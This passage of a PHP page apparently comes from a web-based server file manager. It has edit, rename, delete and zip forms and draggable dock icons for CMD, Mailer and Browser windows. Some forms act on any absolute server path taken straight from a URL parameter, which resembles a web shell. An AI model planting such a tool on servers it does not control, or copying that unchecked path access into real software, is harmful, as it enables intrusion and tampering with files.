            echo '<label><input type="radio" name="create_type" value="folder"> Folder</label>';
            echo '</p>';
            echo '<div style="display:grid; grid-template-columns: 1fr; gap:12px;">';
            echo '<div class="input-pill"><span class="material-symbols-rounded">description</span><input type="text" name="file_name" placeholder="File name (base)" autocomplete="off"></div>';
            echo '<div class="input-pill"><span class="material-symbols-rounded">extension</span><select name="file_ext"><option value="php">.php</option><option value="html">.html</option><option value="txt">.txt</option></select></div>';
            echo '<div class="input-pill"><span class="material-symbols-rounded">create_new_folder</span><input type="text" name="folder_name" placeholder="Folder name" autocomplete="off"></div>';
            echo '</div>';
            echo '<p class="form-actions"><button class="icon-action icon-confirm" type="submit" title="Create"><span class="material-symbols-rounded">check_circle</span></button></p>';
            echo '</form>';
        }
        // View removed per request
        // Edit form
        if (isset($_GET['edit']) && !empty($_GET['d'])) {
            $editPath = safePath($BASE_DIR, (string)$_GET['d']);
            if ($editPath && is_file($editPath)) {
                $content = @file_get_contents($editPath);
                if ($content !== false) {
                    echo '<h3 class="section-title"><span class="material-symbols-rounded">edit_square</span> Edit: ' . h(basename($editPath)) . '</h3>';
                    $relForm = ltrim(str_replace($BASE_DIR . DIRECTORY_SEPARATOR, '', $editPath), DIRECTORY_SEPARATOR);
                    $actionRel = h(urlencode($relForm));
                    echo '<form method="post" action="?d=' . $actionRel . '&edit=1">';
                    echo '<div class="editor-wrap">';
                    echo '<input type="hidden" name="do_edit" value="1">';
                    echo '<input type="hidden" name="rel" value="' . h($relForm) . '">';
                    echo '<textarea class="editor-area" name="content" rows="18">' . h($content) . '</textarea>';
                    echo '<p class="editor-actions"><button class="icon-action icon-confirm" type="submit" title="Save"><span class="material-symbols-rounded">check_circle</span></button></p>';
                    echo '</div>';
                    echo '</form>';
                } else {
                    echo '<p class="error"><span class="material-symbols-rounded" aria-hidden="true">error</span> Failed to read file.</p>';
                }
            }
        }
        // Edit form (absolute path)
if ($isOutsideBase && isset($_GET['edit_abs']) && !empty($_GET['os'])) {
    $editPath = realpath((string)$_GET['os']);
            if ($editPath !== false && is_file($editPath)) {
                $content = @file_get_contents($editPath);
                if ($content !== false) {
                    echo '<h3 class="section-title"><span class="material-symbols-rounded">edit_square</span> Edit: ' . h(basename($editPath)) . '</h3>';
                    echo '<form method="post" action="?os=' . h(urlencode($editPath)) . '&edit_abs=1">';
                    echo '<div class="editor-wrap">';
                    echo '<input type="hidden" name="do_edit_abs" value="1">';
echo '<input type="hidden" name="os" value="' . h($editPath) . '">';
                    echo '<textarea class="editor-area" name="content" rows="18">' . h($content) . '</textarea>';
                    echo '<p class="editor-actions"><button class="icon-action icon-confirm" type="submit" title="Save"><span class="material-symbols-rounded">check_circle</span></button></p>';
                    echo '</div>';
                    echo '</form>';
                } else {
                    echo '<p class="error"><span class="material-symbols-rounded" aria-hidden="true">error</span> Failed to read file.</p>';
                }
            }
        }
        // Rename form (file or folder)
        if (isset($_GET['rename']) && !empty($_GET['d'])) {
            $rnPath = safePath($BASE_DIR, (string)$_GET['d']);
            if ($rnPath && (is_file($rnPath) || is_dir($rnPath))) {
                echo '<h3 class="section-title"><span class="material-symbols-rounded">drive_file_rename_outline</span> Rename: ' . h(basename($rnPath)) . '</h3>';
                echo '<form method="post" class="form-wrap">';
                echo '<input type="hidden" name="do_rename" value="1">';
                $relForm = ltrim(str_replace($BASE_DIR . DIRECTORY_SEPARATOR, '', $rnPath), DIRECTORY_SEPARATOR);
                echo '<input type="hidden" name="rel" value="' . h($relForm) . '">';
                echo '<div class="input-pill"><span class="material-symbols-rounded">drive_file_rename_outline</span><input type="text" name="newname" value="' . h(basename($rnPath)) . '" autocomplete="off"></div>';
                echo '<p class="form-actions"><button class="icon-action icon-confirm" type="submit" title="Rename"><span class="material-symbols-rounded">check_circle</span></button></p>';
                echo '</form>';
            }
        }
        // Rename form (absolute)
if ($isOutsideBase && isset($_GET['rename_abs']) && !empty($_GET['os'])) {
    $rnPath = realpath((string)$_GET['os']);
            if ($rnPath !== false && (is_file($rnPath) || is_dir($rnPath))) {
                echo '<h3 class="section-title"><span class="material-symbols-rounded">drive_file_rename_outline</span> Rename: ' . h(basename($rnPath)) . '</h3>';
                echo '<form method="post" class="form-wrap">';
                echo '<input type="hidden" name="do_rename_abs" value="1">';
echo '<input type="hidden" name="os" value="' . h($rnPath) . '">';
                echo '<div class="input-pill"><span class="material-symbols-rounded">drive_file_rename_outline</span><input type="text" name="newname" value="' . h(basename($rnPath)) . '" autocomplete="off"></div>';
                echo '<p class="form-actions"><button class="icon-action icon-confirm" type="submit" title="Rename"><span class="material-symbols-rounded">check_circle</span></button></p>';
                echo '</form>';
            }
        }

        // Delete form (file or folder)
        if (isset($_GET['delete']) && !empty($_GET['d'])) {
            $delPath = safePath($BASE_DIR, (string)$_GET['d']);
            if ($delPath && (is_file($delPath) || is_dir($delPath))) {
                $isD = is_dir($delPath);
                echo '<h3 class="section-title"><span class="material-symbols-rounded">delete_forever</span> Delete: ' . h(basename($delPath)) . '</h3>';
                echo '<p class="error error-center"><span class="material-symbols-rounded" aria-hidden="true">warning</span> This will permanently delete the ' . ($isD ? 'folder and all its contents' : 'file') . '. There is no undo.</p>';
                echo '<form method="post">';
                echo '<input type="hidden" name="do_delete" value="1">';
                $relForm = ltrim(str_replace($BASE_DIR . DIRECTORY_SEPARATOR, '', $delPath), DIRECTORY_SEPARATOR);
                echo '<input type="hidden" name="rel" value="' . h($relForm) . '">';
                $cancelRel = ltrim(str_replace($BASE_DIR . DIRECTORY_SEPARATOR, '', dirname($delPath)), DIRECTORY_SEPARATOR);
                echo '<p class="form-actions">'
                    . '<button type="submit" class="icon-action icon-confirm" title="Confirm delete"><span class="material-symbols-rounded">check_circle</span></button> '
                    . '<a class="icon-action icon-cancel" href="?d=' . h(urlencode($cancelRel)) . '" title="Cancel"><span class="material-symbols-rounded">cancel</span></a>'
                    . '</p>';
                echo '</form>';
            }
        }
        // Delete form (absolute)
if ($isOutsideBase && isset($_GET['delete_abs']) && !empty($_GET['os'])) {
    $delPath = realpath((string)$_GET['os']);
            if ($delPath !== false && (is_file($delPath) || is_dir($delPath))) {
                $isD = is_dir($delPath);
                echo '<h3 class="section-title"><span class="material-symbols-rounded">delete_forever</span> Delete: ' . h(basename($delPath)) . '</h3>';
                echo '<p class="error error-center"><span class="material-symbols-rounded" aria-hidden="true">warning</span> This will permanently delete the ' . ($isD ? 'folder and all its contents' : 'file') . '. There is no undo.</p>';
                echo '<form method="post">';
                echo '<input type="hidden" name="do_delete_abs" value="1">';
echo '<input type="hidden" name="os" value="' . h($delPath) . '">';
                $cancelAbs = dirname($delPath);
                echo '<p class="form-actions">'
                    . '<button type="submit" class="icon-action icon-confirm" title="Confirm delete"><span class="material-symbols-rounded">check_circle</span></button> '
                    . '<a class="icon-action icon-cancel" href="?os=' . h(urlencode($cancelAbs)) . '" title="Cancel"><span class="material-symbols-rounded">cancel</span></a>'
                    . '</p>';
                echo '</form>';
            }
        }

        // Unzip form
        if (isset($_GET['unzip']) && !empty($_GET['d'])) {
            $zipPath = safePath($BASE_DIR, (string)$_GET['d']);
            if ($zipPath && is_file($zipPath) && strtolower(pathinfo($zipPath, PATHINFO_EXTENSION)) === 'zip') {
                $defaultFolder = pathinfo($zipPath, PATHINFO_FILENAME);
                // Gather up to 200 entries from the zip for animation
                $unzEntries = [];
                if (class_exists('ZipArchive')) {
                    $tmpZip = new ZipArchive();
                    if (@$tmpZip->open($zipPath) === true) {
                        $limit = 200;
                        for ($i = 0; $i < $tmpZip->numFiles && $i < $limit; $i++) {
                            $name = (string)$tmpZip->getNameIndex($i);
                            if ($name !== '') { $unzEntries[] = $name; }
                        }
                        @$tmpZip->close();
                    }
                }
                $unzJson = h(json_encode($unzEntries));
                echo '<h3 class="section-title" style="text-align:center;"><span class="material-symbols-rounded">unarchive</span> Unzip: ' . h(basename($zipPath)) . '</h3>';
                echo '<form method="post" class="form-wrap" id="unzip-form" data-entries="' . $unzJson . '" style="text-align:center;">';
                echo '<input type="hidden" name="do_unzip" value="1">';
                $relForm = ltrim(str_replace($BASE_DIR . DIRECTORY_SEPARATOR, '', $zipPath), DIRECTORY_SEPARATOR);
                echo '<input type="hidden" name="rel" value="' . h($relForm) . '">';
                echo '<div class="input-pill" style="margin:12px auto; max-width:480px;"><span class="material-symbols-rounded">create_new_folder</span><input type="text" name="folder" value="' . h($defaultFolder) . '" placeholder="Extract to folder" autocomplete="off"></div>';
                echo '<p class="form-actions"><button class="icon-action icon-confirm" type="submit" title="Unzip"><span class="material-symbols-rounded">check_circle</span></button></p>';
                echo '</form>';
            }
        }
        // Unzip form (absolute)
if ($isOutsideBase && isset($_GET['unzip_abs']) && !empty($_GET['os'])) {
    $zipPath = realpath((string)$_GET['os']);
            if ($zipPath !== false && is_file($zipPath) && strtolower(pathinfo($zipPath, PATHINFO_EXTENSION)) === 'zip') {
                echo '<h3 class="section-title"><span class="material-symbols-rounded">unarchive</span> Unzip: ' . h(basename($zipPath)) . '</h3>';
                echo '<form method="post" class="form-wrap">';
                echo '<input type="hidden" name="do_unzip_abs" value="1">';
echo '<input type="hidden" name="os" value="' . h($zipPath) . '">';
                $defaultFolder = pathinfo($zipPath, PATHINFO_FILENAME);
                echo '<div class="input-pill" style="margin:12px auto; max-width:480px;"><span class="material-symbols-rounded">create_new_folder</span><input type="text" name="folder" value="' . h($defaultFolder) . '" placeholder="Extract to folder" autocomplete="off"></div>';
                echo '<p class="form-actions"><button class="icon-action icon-confirm" type="submit" title="Unzip"><span class="material-symbols-rounded">check_circle</span></button></p>';
                echo '</form>';
            }
        }

        // Zip folder form
        if (isset($_GET['zip']) && !empty($_GET['d'])) {
            $dirPath = safePath($BASE_DIR, (string)$_GET['d']);
            if ($dirPath && is_dir($dirPath)) {
                // Default to date-time-zip.zip (e.g., 20241103-104522-zip.zip)
                $defaultZip = date('Ymd-His') . '-zip.zip';
                // Gather up to 200 entries from directory for animation (relative paths)
                $zipEntries = [];
                $baseLen = strlen($dirPath);
                $limit = 200;
                $it = new RecursiveIteratorIterator(
                    new RecursiveDirectoryIterator($dirPath, FilesystemIterator::SKIP_DOTS),
                    RecursiveIteratorIterator::SELF_FIRST
                );
                foreach ($it as $f) {
                    $p = (string)$f;
                    $rel = ltrim(substr($p, $baseLen), DIRECTORY_SEPARATOR);
                    if ($rel !== '') { $zipEntries[] = $rel; }
                    if (count($zipEntries) >= $limit) { break; }
                }
                $zipJson = h(json_encode($zipEntries));
                echo '<h3 class="section-title" style="text-align:center;"><span class="material-symbols-rounded">package_2</span> Zip: ' . h(basename($dirPath)) . '</h3>';
                echo '<form method="post" class="form-wrap" id="zip-form" data-entries="' . $zipJson . '" style="text-align:center;">';
                echo '<input type="hidden" name="do_zip" value="1">';
                $relForm = ltrim(str_replace($BASE_DIR . DIRECTORY_SEPARATOR, '', $dirPath), DIRECTORY_SEPARATOR);
                echo '<input type="hidden" name="rel" value="' . h($relForm) . '">';
                echo '<div class="input-pill" style="margin:12px auto; max-width:480px;"><span class="material-symbols-rounded">package_2</span><input type="text" name="zipname" value="' . h($defaultZip) . '" placeholder="Archive name" autocomplete="off"></div>';
                echo '<p class="form-actions"><button class="icon-action icon-confirm" type="submit" title="Create ZIP"><span class="material-symbols-rounded">check_circle</span></button></p>';
                echo '</form>';
            }
        }
        // Zip folder form (absolute)
if ($isOutsideBase && isset($_GET['zip_abs']) && !empty($_GET['os'])) {
    $dirPath = realpath((string)$_GET['os']);
            if ($dirPath !== false && is_dir($dirPath)) {
                $defaultZip = date('Ymd-His') . '-zip.zip';
                echo '<h3 class="section-title"><span class="material-symbols-rounded">package_2</span> Zip: ' . h(basename($dirPath)) . '</h3>';
                echo '<form method="post" class="form-wrap">';
                echo '<input type="hidden" name="do_zip_abs" value="1">';
echo '<input type="hidden" name="os" value="' . h($dirPath) . '">';
                echo '<div class="input-pill" style="margin:12px auto; max-width:480px;"><span class="material-symbols-rounded">package_2</span><input type="text" name="zipname" value="' . h($defaultZip) . '" placeholder="Archive name (.zip)" autocomplete="off"></div>';
                echo '<p class="form-actions"><button class="icon-action icon-confirm" type="submit" title="Zip"><span class="material-symbols-rounded">check_circle</span></button></p>';
                echo '</form>';
            }
        }
        ?>
    </div>
    <!-- Download terminal overlay (CMD-style) -->
    <div class="overlay-terminal" id="dl-terminal-overlay" role="dialog" aria-modal="true" aria-label="Downloading">
        <div class="terminal-modal" role="document">
            <div class="titlebar">
                <div class="traffic">
                    <span class="dot red"></span>
                    <span class="dot yellow"></span>
                    <span class="dot green"></span>
                </div>
                <div class="title"><span class="material-symbols-rounded" aria-hidden="true">terminal</span> cmd.exe</div>
            </div>
            <div class="body">
                <div class="output" id="dl-term-output">C:\> </div>
            </div>
        </div>
    </div>

    <!-- Operation terminal overlay for Zip/Unzip -->
    <div class="overlay-terminal" id="op-terminal-overlay" role="dialog" aria-modal="true" aria-label="Operation">
        <div class="terminal-modal" role="document">
            <div class="titlebar">
                <div class="traffic">
                    <span class="dot red"></span>
                    <span class="dot yellow"></span>
                    <span class="dot green"></span>
                </div>
                <div class="title"><span class="material-symbols-rounded" aria-hidden="true">terminal</span> cmd.exe</div>
                <button class="term-close" id="op-term-close-btn" title="Close" aria-label="Close"><span class="material-symbols-rounded" aria-hidden="true">close</span></button>
            </div>
            <div class="body">
                <div class="output" id="op-term-output">C:\> </div>
            </div>
        </div>
    </div>

    <!-- Image preview terminal overlay -->
    <div class="overlay-terminal" id="img-terminal-overlay" role="dialog" aria-modal="true" aria-label="Image Preview">
        <div class="terminal-modal" role="document">
            <div class="titlebar">
                <div class="traffic">
                    <span class="dot red"></span>
                    <span class="dot yellow"></span>
                    <span class="dot green"></span>
                </div>
                <div class="title"><span class="material-symbols-rounded" aria-hidden="true">terminal</span> ~ / command delet — zsh</div>
                <button class="term-close" id="img-term-close-btn" title="Close" aria-label="Close"><span class="material-symbols-rounded" aria-hidden="true">close</span></button>
            </div>
            <div class="body">
                <div class="output" id="img-term-output">C:\> preview image
                </div>
                <div class="img-wrap" style="margin-top:12px; display:flex; align-items:center; justify-content:center;">
                    <img id="img-preview" alt="Image preview" style="max-width:100%; max-height:60vh; border:1px solid rgba(255,255,255,0.08); border-radius:8px;" />
                </div>
            </div>
        </div>
    </div>

    <!-- Delete confirmation terminal overlay (type 'yes' and Enter) -->
    <div class="overlay-terminal" id="del-terminal-overlay" role="dialog" aria-modal="true" aria-label="Delete Confirmation" tabindex="-1">
        <div class="terminal-modal" role="document">
            <div class="titlebar">
                <div class="traffic">
                    <span class="dot red"></span>
                    <span class="dot yellow"></span>
                    <span class="dot green"></span>
                </div>
                <div class="title"><span class="material-symbols-rounded" aria-hidden="true">terminal</span> cmd.exe</div>
                <button class="term-close" id="del-term-close-btn" title="Close" aria-label="Close"><span class="material-symbols-rounded" aria-hidden="true">close</span></button>
            </div>
            <div class="body">
                <div class="output" id="del-term-output">~ % warning</div>
                <!-- Typing happens directly in terminal output; no visible input field -->
            </div>
        </div>
    </div>

    

    <script>
        (function(){
          // (Message and confirm overlay handlers removed per revert)
          // Minimize/restore logic for terminal chrome yellow dot
          var minimizeBtn = document.getElementById('term-minimize');
          var dockBtn = document.getElementById('dock-terminal-btn');
          var dock = document.getElementById('terminal-dock');
          var notesDockBtn = document.getElementById('dock-notes-btn');
          var notesDock = document.getElementById('notes-dock');
          var browserDockBtn = document.getElementById('dock-browser-btn');
          var browserDock = document.getElementById('browser-dock');
          var cmdDockBtn = document.getElementById('dock-cmd-btn');
          var cmdDock = document.getElementById('cmd-dock');
          var wpDockBtn = document.getElementById('dock-wallpaper-btn');
          var wpDock = document.getElementById('wallpaper-dock');
          var mailDockBtn = document.getElementById('dock-mailer-btn');
          var mailDock = document.getElementById('mailer-dock');
          var settingsDockBtn = document.getElementById('dock-settings-btn');
          var settingsDock = document.getElementById('settings-dock');
          var dragging = false, offsetX = 0, offsetY = 0;
          var dockPos = null; // remember last position while minimized
          var lastTapTime = 0; // for touch double-tap
          var notesDragging = false, notesOffsetX = 0, notesOffsetY = 0;
          var notesDockPos = null; // remember notes position while minimized
          var notesLastTapTime = 0;
          var browserDragging = false, browserOffsetX = 0, browserOffsetY = 0;
          var browserDockPos = null;
          var browserLastTapTime = 0;
          var cmdDragging = false, cmdOffsetX = 0, cmdOffsetY = 0;
          var cmdDockPos = null;
          var cmdLastTapTime = 0;
          var wpDragging = false, wpOffsetX = 0, wpOffsetY = 0;
          var wpDockPos = null;
          var wpLastTapTime = 0;
          var mailDragging = false, mailOffsetX = 0, mailOffsetY = 0;
          var mailDockPos = null;
          var mailLastTapTime = 0;
          var settingsDragging = false, settingsOffsetX = 0, settingsOffsetY = 0;
          var settingsDockPos = null;
          function updateDockLabelPosition(btn){
            if (!btn) return;
            var rect = btn.getBoundingClientRect();
            var threshold = 72; // icon(48) + gap + label height approx
            if ((window.innerHeight - rect.bottom) < threshold) {
              btn.classList.add('label-top');
            } else {
              btn.classList.remove('label-top');
            }
          }
          // Position dock icons in a centered 2x4 grid by default (movable later)
          function positionDockRow(){
            var centerX = window.innerWidth / 2;
            var centerY = window.innerHeight / 2;
            var spacingX = 96;   // horizontal spacing between icons
            var spacingY = 140;  // vertical spacing between rows (icon + label gap)
            var row1Top = Math.round(centerY - (spacingY/2));
            var row2Top = Math.round(centerY + (spacingY/2)); // symmetric below center

            // Top row (left ➜ right): Settings, Wallpaper, Mailer
            if (settingsDockBtn && !settingsDockPos) {
              var settingsW = settingsDockBtn.offsetWidth || 48;
              var settingsLeft = centerX - spacingX - (settingsW/2);
              settingsDockBtn.style.transition = 'none';
              settingsDockBtn.style.transform = 'none';
              settingsDockBtn.style.left = settingsLeft + 'px';
              settingsDockBtn.style.top = row1Top + 'px';
              updateDockLabelPosition(settingsDockBtn);
            }
            if (wpDockBtn && !wpDockPos) {
              var wpW = wpDockBtn.offsetWidth || 48;
              var wpLeft = centerX - (wpW/2);
              wpDockBtn.style.transition = 'none';
              wpDockBtn.style.transform = 'none';
              wpDockBtn.style.left = wpLeft + 'px';
              wpDockBtn.style.top = row1Top + 'px';
              updateDockLabelPosition(wpDockBtn);
            }
            if (mailDockBtn && !mailDockPos) {
              var mailW = mailDockBtn.offsetWidth || 48;
              var mailLeft = centerX + spacingX - (mailW/2);
              mailDockBtn.style.transition = 'none';
              mailDockBtn.style.transform = 'none';
              mailDockBtn.style.left = mailLeft + 'px';
              mailDockBtn.style.top = row1Top + 'px';
              updateDockLabelPosition(mailDockBtn);
            }

            // Bottom row (left ➜ right): CMD, Browser, APP 2.0, Notes
            if (cmdDockBtn && !cmdDockPos) {
              var cmdW = cmdDockBtn.offsetWidth || 48;
              var cmdLeft = centerX - (spacingX * 1.5) - (cmdW/2);
              cmdDockBtn.style.transition = 'none';
              cmdDockBtn.style.transform = 'none';
              cmdDockBtn.style.left = cmdLeft + 'px';
              cmdDockBtn.style.top = row2Top + 'px';
              updateDockLabelPosition(cmdDockBtn);
            }
            if (browserDockBtn && !browserDockPos) {
              var browserW = browserDockBtn.offsetWidth || 48;
              var browserLeft = centerX - (spacingX * 0.5) - (browserW/2);
              browserDockBtn.style.transition = 'none';
              browserDockBtn.style.transform = 'none';
              browserDockBtn.style.left = browserLeft + 'px';
              browserDockBtn.style.top = row2Top + 'px';
              updateDockLabelPosition(browserDockBtn);
            }
            if (dockBtn && !dockPos) {
              var appW = dockBtn.offsetWidth || 48;
              var appLeft = centerX + (spacingX * 0.5) - (appW/2);
              dockBtn.style.transition = 'none';
              dockBtn.style.transform = 'none';
              dockBtn.style.left = appLeft + 'px';
              dockBtn.style.top = row2Top + 'px';
              updateDockLabelPosition(dockBtn);
            }
            if (notesDockBtn && !notesDockPos) {
              var notesW = notesDockBtn.offsetWidth || 48;
              var notesLeft = centerX + (spacingX * 1.5) - (notesW/2);
              notesDockBtn.style.transition = 'none';
              notesDockBtn.style.transform = 'none';
              notesDockBtn.style.left = notesLeft + 'px';
              notesDockBtn.style.top = row2Top + 'px';
              updateDockLabelPosition(notesDockBtn);
            }
          }
          if (minimizeBtn) {
            minimizeBtn.addEventListener('click', function(){
              document.body.classList.add('minimized');
              if (dock) dock.style.display = 'block';
              if (notesDock) notesDock.style.display = 'block';
              if (browserDock) browserDock.style.display = 'block';
              if (cmdDock) cmdDock.style.display = 'block';
              if (mailDock) mailDock.style.display = 'block';
              if (wpDock) wpDock.style.display = 'block';
              if (settingsDock) settingsDock.style.display = 'block';
              if (dockBtn) {
                if (dockPos) {
                  dockBtn.style.transform = 'none';
                  dockBtn.style.left = dockPos.left + 'px';
                  dockBtn.style.top = dockPos.top + 'px';
                  updateDockLabelPosition(dockBtn);
                } else {
                  // default row placement handled below
                }
              }
              if (cmdDockBtn) {
                if (cmdDockPos) {
                  cmdDockBtn.style.transform = 'none';
                  cmdDockBtn.style.left = cmdDockPos.left + 'px';
                  cmdDockBtn.style.top = cmdDockPos.top + 'px';
                  updateDockLabelPosition(cmdDockBtn);
                } else {
                  // default row placement handled below
                }
              }
              if (browserDockBtn) {
                if (browserDockPos) {
                  browserDockBtn.style.transform = 'none';
                  browserDockBtn.style.left = browserDockPos.left + 'px';
                  browserDockBtn.style.top = browserDockPos.top + 'px';
                  updateDockLabelPosition(browserDockBtn);
                } else {
                  // default row placement handled below
                }
              }
              if (notesDockBtn) {
                if (notesDockPos) {
                  notesDockBtn.style.transform = 'none';
                  notesDockBtn.style.left = notesDockPos.left + 'px';
                  notesDockBtn.style.top = notesDockPos.top + 'px';
                  updateDockLabelPosition(notesDockBtn);
                } else {
                  // default row placement handled below
                }
              }
              if (mailDockBtn) {
                if (mailDockPos) {
                  mailDockBtn.style.transform = 'none';
                  mailDockBtn.style.left = mailDockPos.left + 'px';
                  mailDockBtn.style.top = mailDockPos.top + 'px';
                  updateDockLabelPosition(mailDockBtn);
                } else {
                  // default row placement handled below
                }
              }
              if (wpDockBtn) {
                if (wpDockPos) {
                  wpDockBtn.style.transform = 'none';
                  wpDockBtn.style.left = wpDockPos.left + 'px';
                  wpDockBtn.style.top = wpDockPos.top + 'px';
                  updateDockLabelPosition(wpDockBtn);
                } else {
                  // default row placement handled below
                }
              }
              if (settingsDockBtn) {
                if (settingsDockPos) {
                  settingsDockBtn.style.transform = 'none';
                  settingsDockBtn.style.left = settingsDockPos.left + 'px';
                  settingsDockBtn.style.top = settingsDockPos.top + 'px';
                  updateDockLabelPosition(settingsDockBtn);
                } else {
                  // default row placement handled below
                }
              }
              // Set default row positions for any icons without saved positions
              positionDockRow();
            });
          }
          if (dockBtn) {
            // Single click: restore
            dockBtn.addEventListener('click', function(ev){
              ev.preventDefault();
              if (dragging) return;
          document.body.classList.remove('minimized');
          if (dock) dock.style.display = 'none';
          if (notesDock) notesDock.style.display = 'none';
          if (browserDock) browserDock.style.display = 'none';
          if (cmdDock) cmdDock.style.display = 'none';
          if (mailDock) mailDock.style.display = 'none';
          if (wpDock) wpDock.style.display = 'none';
          if (settingsDock) settingsDock.style.display = 'none';
            });
            // Touch: single-tap to restore
            dockBtn.addEventListener('touchend', function(ev){
              if (dragging) return; // drag end handled elsewhere
              document.body.classList.remove('minimized');
              if (dock) dock.style.display = 'none';
              if (notesDock) notesDock.style.display = 'none';
              if (browserDock) browserDock.style.display = 'none';
              if (cmdDock) cmdDock.style.display = 'none';
              if (mailDock) mailDock.style.display = 'none';
              if (wpDock) wpDock.style.display = 'none';
              if (settingsDock) settingsDock.style.display = 'none';
            }, { passive: true });
            // Drag handlers
            function startDrag(ev){
              dragging = true;
              var point = ev.touches ? ev.touches[0] : ev;
              var rect = dockBtn.getBoundingClientRect();
              offsetX = point.clientX - rect.left;
              offsetY = point.clientY - rect.top;
              dockBtn.style.transition = 'none';
              dockBtn.style.transform = 'none';
              dockBtn.setAttribute('aria-grabbed', 'true');
              document.body.style.userSelect = 'none';
              document.addEventListener('mousemove', onDrag);
              document.addEventListener('touchmove', onDrag, { passive: false });
              document.addEventListener('mouseup', endDrag);
              document.addEventListener('touchend', endDrag);
            }
            function onDrag(ev){
              if (!dragging) return;
              if (ev.cancelable) ev.preventDefault();
              var point = ev.touches ? ev.touches[0] : ev;
              var left = point.clientX - offsetX;
              var top = point.clientY - offsetY;
              var maxLeft = window.innerWidth - dockBtn.offsetWidth - 8;
              var maxTop = window.innerHeight - dockBtn.offsetHeight - 8;
              if (left < 8) left = 8; if (top < 8) top = 8;
              if (left > maxLeft) left = maxLeft; if (top > maxTop) top = maxTop;
              dockBtn.style.left = left + 'px';
              dockBtn.style.top = top + 'px';
              updateDockLabelPosition(dockBtn);
              dockPos = { left: left, top: top };
            }
            function endDrag(){
              if (!dragging) return;
              dragging = false;
              dockBtn.setAttribute('aria-grabbed', 'false');
              document.body.style.userSelect = '';
              document.removeEventListener('mousemove', onDrag);
              document.removeEventListener('touchmove', onDrag);
              document.removeEventListener('mouseup', endDrag);
              document.removeEventListener('touchend', endDrag);
            }
            dockBtn.addEventListener('mousedown', startDrag);
            dockBtn.addEventListener('touchstart', startDrag, { passive: true });
          }
          // Mailer dock behavior
          if (mailDockBtn) {
            // Single click: open Mailer window
            mailDockBtn.addEventListener('click', function(ev){
              ev.preventDefault();
              if (mailDragging) return;
              var trigger = document.getElementById('mailer-trigger');
              if (trigger) { trigger.click(); } else { if (typeof spawnMailerWindow === 'function') spawnMailerWindow(); }
            });
            // Touch: single tap opens
            mailDockBtn.addEventListener('touchend', function(ev){
              if (mailDragging) return;
              var trigger = document.getElementById('mailer-trigger');
              if (trigger) { trigger.click(); } else { if (typeof spawnMailerWindow === 'function') spawnMailerWindow(); }
            }, { passive: true });
            function mailStartDrag(ev){
              mailDragging = true;
              var point = ev.touches ? ev.touches[0] : ev;
              var rect = mailDockBtn.getBoundingClientRect();
              mailOffsetX = point.clientX - rect.left;
              mailOffsetY = point.clientY - rect.top;
              mailDockBtn.style.transition = 'none';
              mailDockBtn.style.transform = 'none';
              mailDockBtn.setAttribute('aria-grabbed', 'true');
              document.body.style.userSelect = 'none';
              document.addEventListener('mousemove', mailOnDrag);
              document.addEventListener('touchmove', mailOnDrag, { passive: false });
              document.addEventListener('mouseup', mailEndDrag);
              document.addEventListener('touchend', mailEndDrag);
            }
            function mailOnDrag(ev){
              if (!mailDragging) return;
              if (ev.cancelable) ev.preventDefault();
              var point = ev.touches ? ev.touches[0] : ev;
              var left = point.clientX - mailOffsetX;
              var top = point.clientY - mailOffsetY;
              var maxLeft = window.innerWidth - mailDockBtn.offsetWidth - 8;
              var maxTop = window.innerHeight - mailDockBtn.offsetHeight - 8;
              if (left < 8) left = 8; if (top < 8) top = 8;
              if (left > maxLeft) left = maxLeft; if (top > maxTop) top = maxTop;
              mailDockBtn.style.left = left + 'px';
              mailDockBtn.style.top = top + 'px';
              updateDockLabelPosition(mailDockBtn);
              mailDockPos = { left: left, top: top };
            }
            function mailEndDrag(){
              if (!mailDragging) return;
              mailDragging = false;
              mailDockBtn.setAttribute('aria-grabbed', 'false');
              document.body.style.userSelect = '';
              document.removeEventListener('mousemove', mailOnDrag);
              document.removeEventListener('touchmove', mailOnDrag);
              document.removeEventListener('mouseup', mailEndDrag);
              document.removeEventListener('touchend', mailEndDrag);
            }
            mailDockBtn.addEventListener('mousedown', mailStartDrag);
            mailDockBtn.addEventListener('touchstart', mailStartDrag, { passive: true });
          }
          // Settings dock behavior
          if (settingsDockBtn) {
            // Single click: open Settings window
            settingsDockBtn.addEventListener('click', function(ev){
              ev.preventDefault();
              if (settingsDragging) return;
              if (typeof spawnSettingsWindow === 'function') { spawnSettingsWindow(); }
            });
            // Touch: single tap opens
            settingsDockBtn.addEventListener('touchend', function(ev){
              if (settingsDragging) return;
              if (typeof spawnSettingsWindow === 'function') { spawnSettingsWindow(); }
            }, { passive: true });
            function settingsStartDrag(ev){
              settingsDragging = true;
              var point = ev.touches ? ev.touches[0] : ev;
              var rect = settingsDockBtn.getBoundingClientRect();
              settingsOffsetX = point.clientX - rect.left;
              settingsOffsetY = point.clientY - rect.top;
              settingsDockBtn.style.transition = 'none';
              settingsDockBtn.style.transform = 'none';
              settingsDockBtn.setAttribute('aria-grabbed', 'true');
              document.body.style.userSelect = 'none';
              document.addEventListener('mousemove', settingsOnDrag);
              document.addEventListener('touchmove', settingsOnDrag, { passive: false });
              document.addEventListener('mouseup', settingsEndDrag);
              document.addEventListener('touchend', settingsEndDrag);
            }
            function settingsOnDrag(ev){
              if (!settingsDragging) return;
              if (ev.cancelable) ev.preventDefault();
              var point = ev.touches ? ev.touches[0] : ev;
              var left = point.clientX - settingsOffsetX;
              var top = point.clientY - settingsOffsetY;
              var maxLeft = window.innerWidth - settingsDockBtn.offsetWidth - 8;
              var maxTop = window.innerHeight - settingsDockBtn.offsetHeight - 8;
              if (left < 8) left = 8; if (top < 8) top = 8;
              if (left > maxLeft) left = maxLeft; if (top > maxTop) top = maxTop;
              settingsDockBtn.style.left = left + 'px';
              settingsDockBtn.style.top = top + 'px';
              updateDockLabelPosition(settingsDockBtn);
              settingsDockPos = { left: left, top: top };
            }
            function settingsEndDrag(){
              if (!settingsDragging) return;
              settingsDragging = false;
              settingsDockBtn.setAttribute('aria-grabbed', 'false');
              document.body.style.userSelect = '';
              document.removeEventListener('mousemove', settingsOnDrag);
              document.removeEventListener('touchmove', settingsOnDrag);
              document.removeEventListener('mouseup', settingsEndDrag);
              document.removeEventListener('touchend', settingsEndDrag);
            }
            settingsDockBtn.addEventListener('mousedown', settingsStartDrag);
            settingsDockBtn.addEventListener('touchstart', settingsStartDrag, { passive: true });
          }
          // Browser dock behavior
          if (browserDockBtn) {
            // Single click: open Browser window
            browserDockBtn.addEventListener('click', function(ev){
              ev.preventDefault();
              if (browserDragging) return;
              var trigger = document.getElementById('browser-trigger');
              if (trigger) { trigger.click(); }
            });
